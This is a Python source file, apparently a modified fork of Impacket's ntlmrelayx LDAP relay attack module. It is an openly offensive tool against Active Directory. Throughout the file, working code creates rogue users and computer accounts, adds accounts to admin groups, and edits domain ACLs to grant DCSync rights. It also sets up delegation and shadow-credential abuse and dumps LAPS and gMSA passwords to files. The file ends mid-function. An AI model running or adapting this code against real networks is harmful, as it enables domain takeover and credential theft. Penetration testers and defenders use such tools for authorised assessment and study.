# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2021 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   LDAP Attack Class
#   LDAP(s) protocol relay attack
#
# Authors:
#   Alberto Solino (@agsolino)
#   Dirk-jan Mollema (@_dirkjan) / Fox-IT (https://www.fox-it.com)
#
import _thread
import random
import string
import json
import datetime
import binascii
import codecs
import re
import ldap3
import ldapdomaindump
import config
from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM
from ldap3.utils.conv import escape_filter_chars
import os
from Cryptodome.Hash import MD4

from impacket import LOG
from impacket.examples.ldap_shell import LdapShell
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from comm.ntlmrelayx.attacks.shadowCredential import ShadowCredentials
from impacket.examples.ntlmrelayx.utils.tcpshell import TcpShell
from impacket.ldap import ldaptypes
from impacket.ldap.ldaptypes import ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, ACCESS_ALLOWED_ACE, ACE, OBJECTTYPE_GUID_MAP
from impacket.uuid import string_to_bin, bin_to_string
from impacket.structure import Structure, hexdump

# This is new from ldap3 v2.5
try:
    from ldap3.protocol.microsoft import security_descriptor_control
except ImportError:
    # We use a print statement because the logger is not initialized yet here
    print("Failed to import required functions from ldap3. ntlmrelayx requires ldap3 >= 2.5.0. \
Please update with 'python -m pip install ldap3 --upgrade'")
PROTOCOL_ATTACK_CLASS = "LDAPAttack"

# Define global variables to prevent dumping the domain twice
# and to prevent privilege escalating more than once
dumpedDomain = False
alreadyEscalated = False
alreadyAddedComputer = False
delegatePerformed = []

#gMSA structure
class MSDS_MANAGEDPASSWORD_BLOB(Structure):
    structure = (
        ('Version','<H'),
        ('Reserved','<H'),
        ('Length','<L'),
        ('CurrentPasswordOffset','<H'),
        ('PreviousPasswordOffset','<H'),
        ('QueryPasswordIntervalOffset','<H'),
        ('UnchangedPasswordIntervalOffset','<H'),
        ('CurrentPassword',':'),
        ('PreviousPassword',':'),
        #('AlignmentPadding',':'),
        ('QueryPasswordInterval',':'),
        ('UnchangedPasswordInterval',':'),
    )

    def __init__(self, data = None):
        Structure.__init__(self, data = data)

    def fromString(self, data):
        Structure.fromString(self,data)

        if self['PreviousPasswordOffset'] == 0:
            endData = self['QueryPasswordIntervalOffset']
        else:
            endData = self['PreviousPasswordOffset']

        self['CurrentPassword'] = self.rawData[self['CurrentPasswordOffset']:][:endData - self['CurrentPasswordOffset']]
        if self['PreviousPasswordOffset'] != 0:
            self['PreviousPassword'] = self.rawData[self['PreviousPasswordOffset']:][:self['QueryPasswordIntervalOffset']-self['PreviousPasswordOffset']]

        self['QueryPasswordInterval'] = self.rawData[self['QueryPasswordIntervalOffset']:][:self['UnchangedPasswordIntervalOffset']-self['QueryPasswordIntervalOffset']]
        self['UnchangedPasswordInterval'] = self.rawData[self['UnchangedPasswordIntervalOffset']:]


class LDAPAttack(ProtocolAttack):
    """
    This is the default LDAP attack. It checks the privileges of the relayed account
    and performs a domaindump if the user does not have administrative privileges.
    If the user is an Enterprise or Domain admin, a new user is added to escalate to DA.
    """
    PLUGIN_NAMES = ["LDAP", "LDAPS"]

    # ACL constants
    # When reading, these constants are actually represented by
    # the following for Active Directory specific Access Masks
    # Reference: https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2
    GENERIC_READ            = 0x00020094
    GENERIC_WRITE           = 0x00020028
    GENERIC_EXECUTE         = 0x00020004
    GENERIC_ALL             = 0x000F01FF

    def __init__(self, config, LDAPClient, username):
        self.computerName = '' if config.addcomputer == 'Rand' else config.addcomputer
        self.userDomain = config.userDomain
        self.kdc = config.kdc
        ProtocolAttack.__init__(self, config, LDAPClient, username)
        if self.config.interactive:
            # Launch locally listening interactive shell.
            self.tcp_shell = TcpShell()

    def addComputer(self, parent, domainDumper):
        """
        Add a new computer. Parent is preferably CN=computers,DC=Domain,DC=local, but can
        also be an OU or other container where we have write privileges
        """
        global alreadyAddedComputer
        if alreadyAddedComputer:
            LOG.error('New computer already added. Refusing to add another')
            return

        # Random password
        newPassword = ''.join(random.choice(string.ascii_letters + string.digits + '.,;:!$-_+/*(){}#@<>^') for _ in range(15))

        # Get the domain we are in
        domaindn = domainDumper.root
        domain = re.sub(',DC=', '.', domaindn[domaindn.find('DC='):], flags=re.I)[3:]

        computerName = self.computerName
        if not computerName:
            # Random computername
            newComputer = (''.join(random.choice(string.ascii_letters) for _ in range(8)) + '$').upper()
        else:
            newComputer = computerName if computerName.endswith('$') else computerName + '$'

        computerHostname = newComputer[:-1]
        newComputerDn = ('CN=%s,%s' % (computerHostname, parent)).encode('utf-8')

        # Default computer SPNs
        spns = [
            'HOST/%s' % computerHostname,
            'HOST/%s.%s' % (computerHostname, domain),
            'RestrictedKrbHost/%s' % computerHostname,
            'RestrictedKrbHost/%s.%s' % (computerHostname, domain),
        ]
        ucd = {
            'dnsHostName': '%s.%s' % (computerHostname, domain),
            'userAccountControl': 4096,
            'servicePrincipalName': spns,
            'sAMAccountName': newComputer,
            'unicodePwd': '"{}"'.format(newPassword).encode('utf-16-le')
        }
        LOG.debug('New computer info %s', ucd)
        LOG.info('Attempting to create computer in: %s', parent)
        res = self.client.add(newComputerDn.decode('utf-8'), ['top','person','organizationalPerson','user','computer'], ucd)
        if not res:
            # Adding computers requires LDAPS
            if self.client.result['result'] == RESULT_UNWILLING_TO_PERFORM and not self.client.server.ssl:
                LOG.error('Failed to add a new computer. The server denied the operation. Try relaying to LDAP with TLS enabled (ldaps) or escalating an existing account.')
            else:
                LOG.error('Failed to add a new computer: %s' % str(self.client.result))
            return False
        else:
            LOG.critical('Adding new computer with username: %s and password: %s result: OK' % (newComputer, newPassword))
            config.set_newPassword(newPassword)
            config.set_newUser(newComputer)
            alreadyAddedComputer = True
            # Return the SAM name
            return newComputer

    def addUser(self, parent, domainDumper):
        """
        Add a new user. Parent is preferably CN=Users,DC=Domain,DC=local, but can
        also be an OU or other container where we have write privileges
        """
        global alreadyEscalated
        if alreadyEscalated:
            LOG.error('New user already added. Refusing to add another')
            return

        # Random password
        newPassword = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))

        # Random username
        newUser = ''.join(random.choice(string.ascii_letters) for _ in range(10))
        newUserDn = 'CN=%s,%s' % (newUser, parent)
        ucd = {
            'objectCategory': 'CN=Person,CN=Schema,CN=Configuration,%s' % domainDumper.root,
            'distinguishedName': newUserDn,
            'cn': newUser,
            'sn': newUser,
            'givenName': newUser,
            'displayName': newUser,
            'name': newUser,
            'userAccountControl': 512,
            'accountExpires': '0',
            'sAMAccountName': newUser,
            'unicodePwd': '"{}"'.format(newPassword).encode('utf-16-le')
        }
        LOG.info('Attempting to create user in: %s', parent)
        res = self.client.add(newUserDn, ['top', 'person', 'organizationalPerson', 'user'], ucd)
        if not res:
            # Adding users requires LDAPS
            if self.client.result['result'] == RESULT_UNWILLING_TO_PERFORM and not self.client.server.ssl:
                LOG.error('Failed to add a new user. The server denied the operation. Try relaying to LDAP with TLS enabled (ldaps) or escalating an existing user.')
            else:
                LOG.error('Failed to add a new user: %s' % str(self.client.result))
            return False
        else:
            LOG.info('Adding new user with username: %s and password: %s result: OK' % (newUser, newPassword))

            # Return the DN
            return newUserDn

    def addUserToGroup(self, userDn, domainDumper, groupDn):
        global alreadyEscalated
        # For display only
        groupName = groupDn.split(',')[0][3:]
        userName = userDn.split(',')[0][3:]
        # Now add the user as a member to this group
        res = self.client.modify(groupDn, {
            'member': [(ldap3.MODIFY_ADD, [userDn])]})
        if res:
            LOG.info('Adding user: %s to group %s result: OK' % (userName, groupName))
            LOG.info('Privilege escalation succesful, shutting down...')
            alreadyEscalated = True
            _thread.interrupt_main()
        else:
            LOG.error('Failed to add user to %s group: %s' % (groupName, str(self.client.result)))
    
    def shadowCredentialAttack(self, domainDumper, ldap_session, target):
        shadowcreds = ShadowCredentials(domainDumper, ldap_session, target)
        pfx_pass = config.get_pass()
        shadowcreds.add(export_type="PFX", domain=self.userDomain, password=pfx_pass, path=target.replace("$",""), dc_ip=self.kdc)
        config.set_targetName(target)
        config.set_priv(True)

    def delegateAttack(self, usersam, targetsam, domainDumper, sid):
        global delegatePerformed
        if targetsam in delegatePerformed:
            LOG.info('Delegate attack already performed for this computer, skipping')
            return
        if not usersam or "$" not in self.config.escalateuser:
            usersam = self.addComputer('CN=Computers,%s' % domainDumper.root, domainDumper)
            self.config.escalateuser = usersam

        if not sid:
            # Get escalate user sid
            result = self.getUserInfo(domainDumper, usersam)
            if not result:
                LOG.error('User to escalate does not exist!')
                return
            escalate_sid = str(result[1])
        else:
            escalate_sid = usersam

        # Get target computer DN
        result = self.getUserInfo(domainDumper, targetsam)
        if not result:
            LOG.error('Computer to modify does not exist! (wrong domain?)')
            return
        target_dn = result[0]

        self.client.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName','objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
        targetuser = None
        for entry in self.client.response:
            if entry['type'] != 'searchResEntry':
                continue
            targetuser = entry
        if not targetuser:
            LOG.error('Could not query target user properties')
            return
        try:
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=targetuser['raw_attributes']['msDS-AllowedToActOnBehalfOfOtherIdentity'][0])
            LOG.debug('Currently allowed sids:')
            for ace in sd['Dacl'].aces:
                LOG.debug('    %s' % ace['Ace']['Sid'].formatCanonical())
        except IndexError:
            # Create DACL manually
            sd = create_empty_sd()
        sd['Dacl'].aces.append(create_allow_ace(escalate_sid))
        self.client.modify(targetuser['dn'], {'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]})
        if self.client.result['result'] == 0:
            LOG.critical('Delegation rights modified succesfully!')
            LOG.info('%s can now impersonate users on %s via S4U2Proxy', usersam, targetsam)
            config.set_targetName(targetsam)
            config.set_priv(True)
            delegatePerformed.append(targetsam)
            return True
        else:
            if self.client.result['result'] == 50:
                LOG.error('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
            elif self.client.result['result'] == 19:
                LOG.error('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
            else:
                LOG.error('The server returned an error: %s', self.client.result['message'])
        return

    def aclAttack(self, userDn, domainDumper):
        global alreadyEscalated
        if alreadyEscalated:
            LOG.error('ACL attack already performed. Refusing to continue')
            return

        # Dictionary for restore data
        restoredata = {}

        # Query for the sid of our user
        self.client.search(userDn, '(objectClass=user)', attributes=['sAMAccountName', 'objectSid'])
        entry = self.client.entries[0]
        username = entry['sAMAccountName'].value
        usersid = entry['objectSid'].value
        LOG.debug('Found sid for user %s: %s' % (username, usersid))

        # Set SD flags to only query for DACL
        controls = security_descriptor_control(sdflags=0x04)
        alreadyEscalated = True

        LOG.info('Querying domain security descriptor')
        self.client.search(domainDumper.root, '(&(objectCategory=domain))', attributes=['SAMAccountName','nTSecurityDescriptor'], controls=controls)
        entry = self.client.entries[0]
        secDescData = entry['nTSecurityDescriptor'].raw_values[0]
        secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)

        # Save old SD for restore purposes
        restoredata['old_sd'] = binascii.hexlify(secDescData).decode('utf-8')
        restoredata['target_sid'] = usersid

        secDesc['Dacl']['Data'].append(create_object_ace('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', usersid))
        secDesc['Dacl']['Data'].append(create_object_ace('1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', usersid))
        dn = entry.entry_dn
        data = secDesc.getData()
        self.client.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
        if self.client.result['result'] == 0:
            alreadyEscalated = True
            LOG.critical(
                'Success! User %s now has Replication-Get-Changes-All privileges on the domain', username)
            LOG.info('Try using DCSync with secretsdump.py and this user :)')
            config.set_priv(True)
            config.set_dcsync(True)

            # Query the SD again to see what AD made of it
            self.client.search(domainDumper.root, '(&(objectCategory=domain))', attributes=['SAMAccountName','nTSecurityDescriptor'], controls=controls)
            entry = self.client.entries[0]
            newSD = entry['nTSecurityDescriptor'].raw_values[0]
            # Save this to restore the SD later on
            restoredata['target_dn'] = dn
            restoredata['new_sd'] = binascii.hexlify(newSD).decode('utf-8')
            restoredata['success'] = True
            self.writeRestoreData(restoredata, dn)
            return True
        else:
            LOG.error('Error when updating ACL: %s' % self.client.result)
            return False

    def writeRestoreData(self, restoredata, domaindn):
        output = {}
        domain = re.sub(',DC=', '.', domaindn[domaindn.find('DC='):], flags=re.I)[3:]
        output['config'] = {'server':self.client.server.host,'domain':domain}
        output['history'] = [{'operation': 'add_domain_sync', 'data': restoredata, 'contextuser': self.username}]
        now = datetime.datetime.now()
        filename = 'aclpwn-%s.restore' % now.strftime("%Y%m%d-%H%M%S")
        # Save the json to file
        with codecs.open(filename, 'w', 'utf-8') as outfile:
            json.dump(output, outfile)
        LOG.critical('Saved restore state to %s', filename)

    def validatePrivileges(self, uname, domainDumper):
        # Find the user's DN
        membersids = []
        sidmapping = {}
        privs = {
            'create': False, # Whether we can create users
            'createIn': None, # Where we can create users
            'escalateViaGroup': False, # Whether we can escalate via a group
            'escalateGroup': None, # The group we can escalate via
            'aclEscalate': False, # Whether we can escalate via ACL on the domain object
            'aclEscalateIn': None # The object which ACL we can edit
        }
        self.client.search(domainDumper.root, '(sAMAccountName=%s)' % escape_filter_chars(uname), attributes=['objectSid', 'primaryGroupId'])
        user = self.client.entries[0]
        usersid = user['objectSid'].value
        sidmapping[usersid] = user.entry_dn
        membersids.append(usersid)
        # The groups the user is a member of
        self.client.search(domainDumper.root, '(member:1.2.840.113556.1.4.1941:=%s)' % escape_filter_chars(user.entry_dn), attributes=['name', 'objectSid'])
        LOG.debug('User is a member of: %s' % self.client.entries)
        for entry in self.client.entries:
            sidmapping[entry['objectSid'].value] = entry.entry_dn
            membersids.append(entry['objectSid'].value)
        # Also search by primarygroupid
        # First get domain SID
        self.client.search(domainDumper.root, '(objectClass=domain)', attributes=['objectSid'])
        domainsid = self.client.entries[0]['objectSid'].value
        gid = user['primaryGroupId'].value
        # Now search for this group by SID
        self.client.search(domainDumper.root, '(objectSid=%s-%d)' % (domainsid, gid), attributes=['name', 'objectSid', 'distinguishedName'])
        group = self.client.entries[0]
        LOG.debug('User is a member of: %s' % self.client.entries)
        # Add the group sid of the primary group to the list
        sidmapping[group['objectSid'].value] = group.entry_dn
        membersids.append(group['objectSid'].value)
        controls = security_descriptor_control(sdflags=0x05) # Query Owner and Dacl
        # Now we have all the SIDs applicable to this user, now enumerate the privileges of domains and OUs
        entries = self.client.extend.standard.paged_search(domainDumper.root, '(|(objectClass=domain)(objectClass=organizationalUnit))', attributes=['nTSecurityDescriptor', 'objectClass'], controls=controls, generator=True)
        self.checkSecurityDescriptors(entries, privs, membersids, sidmapping, domainDumper)
        # Also get the privileges on the default Users container
        entries = self.client.extend.standard.paged_search(domainDumper.root, '(&(cn=Users)(objectClass=container))', attributes=['nTSecurityDescriptor', 'objectClass'], controls=controls, generator=True)
        self.checkSecurityDescriptors(entries, privs, membersids, sidmapping, domainDumper)

        # Interesting groups we'd like to be a member of, in order of preference
        interestingGroups = [
            '%s-%d' % (domainsid, 519), # Enterprise admins
            '%s-%d' % (domainsid, 512), # Domain admins
            'S-1-5-32-544', # Built-in Administrators
            'S-1-5-32-551', # Backup operators
            'S-1-5-32-548', # Account operators
        ]
        privs['escalateViaGroup'] = False
        for group in interestingGroups:
            self.client.search(domainDumper.root, '(objectSid=%s)' % group, attributes=['nTSecurityDescriptor', 'objectClass'], controls=controls)
            groupdata = self.client.response
            self.checkSecurityDescriptors(groupdata, privs, membersids, sidmapping, domainDumper)
            if privs['escalateViaGroup']:
                # We have a result - exit the loop
                break
        return (usersid, privs)

    def getUserInfo(self, domainDumper, samname):
        entries = self.client.search(domainDumper.root, '(sAMAccountName=%s)' % escape_filter_chars(samname), attributes=['objectSid'])
        try:
            dn = self.client.entries[0].entry_dn
            sid = self.client.entries[0]['objectSid']
            return (dn, sid)
        except IndexError:
            LOG.error('User not found in LDAP: %s' % samname)
            return False

    def checkSecurityDescriptors(self, entries, privs, membersids, sidmapping, domainDumper):
        standardrights = [
            self.GENERIC_ALL,
            self.GENERIC_WRITE,
            self.GENERIC_READ,
            ACCESS_MASK.WRITE_DACL
        ]
        for entry in entries:
            if entry['type'] != 'searchResEntry':
                continue
            dn = entry['dn']
            try:
                sdData = entry['raw_attributes']['nTSecurityDescriptor'][0]
            except IndexError:
                # We don't have the privileges to read this security descriptor
                LOG.debug('Access to security descriptor was denied for DN %s', dn)
                continue
            hasFullControl = False
            secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR()
            secDesc.fromString(sdData)
            if secDesc['OwnerSid'] != '' and secDesc['OwnerSid'].formatCanonical() in membersids:
                sid = secDesc['OwnerSid'].formatCanonical()
                LOG.debug('Permission found: Full Control on %s; Reason: Owner via %s' % (dn, sidmapping[sid]))
                hasFullControl = True
            # Iterate over all the ACEs
            for ace in secDesc['Dacl'].aces:
                sid = ace['Ace']['Sid'].formatCanonical()
                if ace['AceType'] != ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE and ace['AceType'] != ACCESS_ALLOWED_ACE.ACE_TYPE:
                    continue
                if not ace.hasFlag(ACE.INHERITED_ACE) and ace.hasFlag(ACE.INHERIT_ONLY_ACE):
                    # ACE is set on this object, but only inherited, so not applicable to us
                    continue

                # Check if the ACE has restrictions on object type (inherited case)
                if ace['AceType'] == ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE \
                    and ace.hasFlag(ACE.INHERITED_ACE) \
                    and ace['Ace'].hasFlag(ACCESS_ALLOWED_OBJECT_ACE.ACE_INHERITED_OBJECT_TYPE_PRESENT):
                    # Verify if the ACE applies to this object type
                    inheritedObjectType = bin_to_string(ace['Ace']['InheritedObjectType']).lower()
                    if not self.aceApplies(inheritedObjectType, entry['raw_attributes']['objectClass'][-1]):
                        continue
                # Check for non-extended rights that may not apply to us
                if ace['Ace']['Mask']['Mask'] in standardrights or ace['Ace']['Mask'].hasPriv(ACCESS_MASK.WRITE_DACL):
                    # Check if this applies to our objecttype
                    if ace['AceType'] == ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE  and ace['Ace'].hasFlag(ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT):
                        objectType = bin_to_string(ace['Ace']['ObjectType']).lower()
                        if not self.aceApplies(objectType, entry['raw_attributes']['objectClass'][-1]):
                            # LOG.debug('ACE does not apply, only to %s', objectType)
                            continue
                if sid in membersids:
                    # Generic all
                    if ace['Ace']['Mask'].hasPriv(self.GENERIC_ALL):
                        ace.dump()
                        LOG.debug('Permission found: Full Control on %s; Reason: GENERIC_ALL via %s' % (dn, sidmapping[sid]))
                        hasFullControl = True
                    if can_create_users(ace) or hasFullControl:
                        if not hasFullControl:
                            LOG.debug('Permission found: Create users in %s; Reason: Granted to %s' % (dn, sidmapping[sid]))
                        if dn == 'CN=Users,%s' % domainDumper.root:
                            # We can create users in the default container, this is preferred
                            privs['create'] = True
                            privs['createIn'] = dn
                        else:
                            # Could be a different OU where we have access
                            # store it until we find a better place
                            if privs['createIn'] != 'CN=Users,%s' % domainDumper.root and b'organizationalUnit' in entry['raw_attributes']['objectClass']:
                                privs['create'] = True
                                privs['createIn'] = dn
                    if can_add_member(ace) or hasFullControl:
                        if b'group' in entry['raw_attributes']['objectClass']:
                            # We can add members to a group
                            if not hasFullControl:
                                LOG.debug('Permission found: Add member to %s; Reason: Granted to %s' % (dn, sidmapping[sid]))
                            privs['escalateViaGroup'] = True
                            privs['escalateGroup'] = dn
                    if ace['Ace']['Mask'].hasPriv(ACCESS_MASK.WRITE_DACL) or hasFullControl:
                        # Check if the ACE is an OBJECT ACE, if so the WRITE_DACL is applied to
                        # a property, which is both weird and useless, so we skip it
                        if ace['AceType'] == ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE \
                            and ace['Ace'].hasFlag(ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT):
                            # LOG.debug('Skipping WRITE_DACL since it has an ObjectType set')
                            continue
                        if not hasFullControl:
                            LOG.debug('Permission found: Write Dacl of %s; Reason: Granted to %s' % (dn, sidmapping[sid]))
                        # We can modify the domain Dacl
                        if b'domain' in entry['raw_attributes']['objectClass']:
                            privs['aclEscalate'] = True
                            privs['aclEscalateIn'] = dn

    @staticmethod
    def aceApplies(ace_guid, object_class):
        '''
        Checks if an ACE applies to this object (based on object classes).
        Note that this function assumes you already verified that InheritedObjectType is set (via the flag).
        If this is not set, the ACE applies to all object types.
        '''
        try:
            our_ace_guid = OBJECTTYPE_GUID_MAP[object_class]
        except KeyError:
            return False
        if ace_guid == our_ace_guid:
            return True
        # If none of these match, the ACE does not apply to this object
        return False


    def run(self):
        #self.client.search('dc=vulnerable,dc=contoso,dc=com', '(objectclass=person)')
        #print self.client.entries
        global dumpedDomain
        # Set up a default config
        domainDumpConfig = ldapdomaindump.domainDumpConfig()

        # Change the output directory to configured rootdir
        domainDumpConfig.basepath = self.config.lootdir

        # Create new dumper object
        domainDumper = ldapdomaindump.domainDumper(self.client.server, self.client, domainDumpConfig)

        if self.config.interactive:
            if self.tcp_shell is not None:
                LOG.info('Started interactive Ldap shell via TCP on 127.0.0.1:%d' % self.tcp_shell.port)
                # Start listening and launch interactive shell.
                self.tcp_shell.listen()
                ldap_shell = LdapShell(self.tcp_shell, domainDumper, self.client)
                ldap_shell.cmdloop()
                return

        # If specified validate the user's privileges. This might take a while on large domains but will
        # identify the proper containers for escalating via the different techniques.
        if self.config.validateprivs:
            LOG.info('Enumerating relayed user\'s privileges. This may take a while on large domains')
            userSid, privs = self.validatePrivileges(self.username, domainDumper)
            if privs['create']:
                LOG.info('User privileges found: Create user')
            if privs['escalateViaGroup']:
                name = privs['escalateGroup'].split(',')[0][3:]
                LOG.info('User privileges found: Adding user to a privileged group (%s)' % name)
            if privs['aclEscalate']:
                LOG.info('User privileges found: Modifying domain ACL')

        # If validation of privileges is not desired, we assumed that the user has permissions to escalate
        # an existing user via ACL attacks.
        else:
            LOG.info('Assuming relayed user has privileges to escalate a user via ACL attack')
            privs = dict()
            privs['create'] = False
            privs['aclEscalate'] = True
            privs['escalateViaGroup'] = False

        # We prefer ACL escalation since it is more quiet
        if self.config.aclattack and privs['aclEscalate']:
            LOG.debug('Performing ACL attack')
            if self.config.escalateuser:
                # We can escalate an existing user
                result = self.getUserInfo(domainDumper, self.config.escalateuser)
                # Unless that account does not exist of course
                if not result:
                    LOG.error('Unable to escalate without a valid user.')
                else:
                    userDn, userSid = result
                    # Perform the ACL attack
                    self.aclAttack(userDn, domainDumper)
            elif privs['create']:
                # Create a nice shiny new user for the escalation
                userDn = self.addUser(privs['createIn'], domainDumper)
                if not userDn:
                    LOG.error('Unable to escalate without a valid user.')
                # Perform the ACL attack
                else:
                    self.aclAttack(userDn, domainDumper)
            else:
                LOG.error('Cannot perform ACL escalation because we do not have create user '\
                    'privileges. Specify a user to assign privileges to with --escalate-user')

        # If we can't ACL escalate, try adding us to a privileged group
        if self.config.addda and privs['escalateViaGroup']:
            LOG.debug('Performing Group attack')
            if self.config.escalateuser:
                # We can escalate an existing user
                result = self.getUserInfo(domainDumper, self.config.escalateuser)
                # Unless that account does not exist of course
                if not result:
                    LOG.error('Unable to escalate without a valid user.')
                # Perform the Group attack
                else:
                    userDn, userSid = result
                    self.addUserToGroup(userDn, domainDumper, privs['escalateGroup'])

            elif privs['create']:
                # Create a nice shiny new user for the escalation
                userDn = self.addUser(privs['createIn'], domainDumper)
                if not userDn:
                    LOG.error('Unable to escalate without a valid user, aborting.')
                # Perform the Group attack
                else:
                    self.addUserToGroup(userDn, domainDumper, privs['escalateGroup'])

            else:
                LOG.error('Cannot perform ACL escalation because we do not have create user '\
                          'privileges. Specify a user to assign privileges to with --escalate-user')

        # Dump LAPS Passwords
        if self.config.dumplaps:
            LOG.info("Attempting to dump LAPS passwords")

            success = self.client.search(domainDumper.root, '(&(objectCategory=computer))', search_scope=ldap3.SUBTREE, attributes=['DistinguishedName','ms-MCS-AdmPwd'])
            
            if success:

                fd = None
                filename = "laps-dump-" + self.username + "-" + str(random.randint(0, 99999))
                count = 0

                for entry in self.client.response:
                    try:
                        dn = "DN:" + entry['attributes']['distinguishedname']
                        passwd = "Password:" + entry['attributes']['ms-MCS-AdmPwd']

                        if fd is None:
                            fd = open(filename, "a+")

                        count += 1

                        LOG.debug(dn)
                        LOG.debug(passwd)

                        fd.write(dn)
                        fd.write("\n")
                        fd.write(passwd)
                        fd.write("\n")

                    except:
                        continue

                if fd is None:
                    LOG.info("The relayed user %s does not have permissions to read any LAPS passwords" % self.username)
                else:
                    LOG.info("Successfully dumped %d LAPS passwords through relayed account %s" % (count, self.username))
                    fd.close()

        #Dump gMSA Passwords
        if self.config.dumpgmsa:
            LOG.info("Attempting to dump gMSA passwords")
            success = self.client.search(domainDumper.root, '(&(ObjectClass=msDS-GroupManagedServiceAccount))', search_scope=ldap3.SUBTREE, attributes=['sAMAccountName','msDS-ManagedPassword'])
            if success:
                fd = None
                filename = "gmsa-dump-" + self.username + "-" + str(random.randint(0, 99999))
                count = 0
                for entry in self.client.response:
                    try:
                        sam = entry['attributes']['sAMAccountName']
                        data = entry['attributes']['msDS-ManagedPassword']
                        blob = MSDS_MANAGEDPASSWORD_BLOB()
                        blob.fromString(data)
                        hash = MD4.new ()
                        hash.update (blob['CurrentPassword'][:-2])
                        passwd = binascii.hexlify(hash.digest()).decode("utf-8")
                        userpass = sam + ':::' + passwd
                        LOG.info(userpass)
                        count += 1
                        if fd is None:
                            fd = open(filename, "a+")
                        fd.write(userpass)
                        fd.write("\n")
                    except:
                        continue
                if fd is None:
                    LOG.info("The relayed user %s does not have permissions to read any gMSA passwords" % self.username)
                else:
                    LOG.info("Successfully dumped %d gMSA passwords through relayed account %s" % (count, self.username))
                    fd.close()

        if self.config.shadowcredential and self.username[-1] == '$':
            try:
                success = self.client.search(domainDumper.root, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
                self.shadowCredentialAttack(domainDumper,self.client,self.username)
            except Exception as e:
                LOG.error("The target Domain Functional Level must be **Windows Server 2016** or above")
                config.set_priv(True)
                return

        # Perform the Delegate attack if it is enabled and we relayed a computer account
        if self.config.delegateaccess and self.username[-1] == '$':
            dcsync = config.get_dcsync()
            if not dcsync:
                self.delegateAttack(self.config.escalateuser, self.username, domainDumper, self.config.sid)
            return

        # Add a new computer if that is requested
        # privileges required are not yet enumerated, neither is ms-ds-MachineAccountQuota
        if self.config.addcomputer:
            self.client.search(domainDumper.root, "(ObjectClass=domain)", attributes=['wellKnownObjects'])
            # Computer well-known GUID
            # https://social.technet.microsoft.com/Forums/windowsserver/en-US/d028952f-a25a-42e6-99c5-28beae2d3ac3/how-can-i-know-the-default-computer-container?forum=winservergen
            computerscontainer = [
                entry.decode('utf-8').split(":")[-1] for entry in self.client.entries[0]["wellKnownObjects"]
                if b"AA312825768811D1ADED00C04FD8D5CD" in entry
            ][0]
            LOG.debug("Computer container is {}".format(computerscontainer))
            self.addComputer(computerscontainer, domainDumper)
            return

        # Last attack, dump the domain if no special privileges are present
        if not dumpedDomain and self.config.dumpdomain:
            # Do this before the dump is complete because of the time this can take
            dumpedDomain = True
            LOG.info('Dumping domain info for first time')
            domainDumper.domainDump()
            LOG.info('Domain info dumped into lootdir!')

# Create an object ACE with the specified privguid and our sid
def create_object_ace(privguid, sid):
    nace = ldaptypes.ACE()
    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
    nace['AceFlags'] = 0x00
    acedata = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE()
    acedata['Mask'] = ldaptypes.ACCESS_MASK()
    acedata['Mask']['Mask'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
    acedata['ObjectType'] = string_to_bin(privguid)
    acedata['InheritedObjectType'] = b''
    acedata['Sid'] = ldaptypes.LDAP_SID()
    acedata['Sid'].fromCanonical(sid)
    assert sid == acedata['Sid'].formatCanonical()
    acedata['Flags'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
    nace['Ace'] = acedata
    return nace

# Create an ALLOW ACE with the specified sid
def create_allow_ace(sid):
    nace = ldaptypes.ACE()
    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
    nace['AceFlags'] = 0x00
    acedata = ldaptypes.ACCESS_ALLOWED_ACE()
    acedata['Mask'] = ldaptypes.ACCESS_MASK()
    acedata['Mask']['Mask'] = 983551 # Full control
    acedata['Sid'] = ldaptypes.LDAP_SID()
    acedata['Sid'].fromCanonical(sid)
    nace['Ace'] = acedata
    return nace

def create_empty_sd():
    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
    sd['Revision'] = b'\x01'
    sd['Sbz1'] = b'\x00'
    sd['Control'] = 32772
    sd['OwnerSid'] = ldaptypes.LDAP_SID()
    # BUILTIN\Administrators
    sd['OwnerSid'].fromCanonical('S-1-5-32-544')
    sd['GroupSid'] = b''
    sd['Sacl'] = b''
    acl = ldaptypes.ACL()
    acl['AclRevision'] = 4
    acl['Sbz1'] = 0
    acl['Sbz2'] = 0
    acl.aces = []
    sd['Dacl'] = acl
    return sd

# Check if an ACE allows for creation of users
def can_create_users(ace):
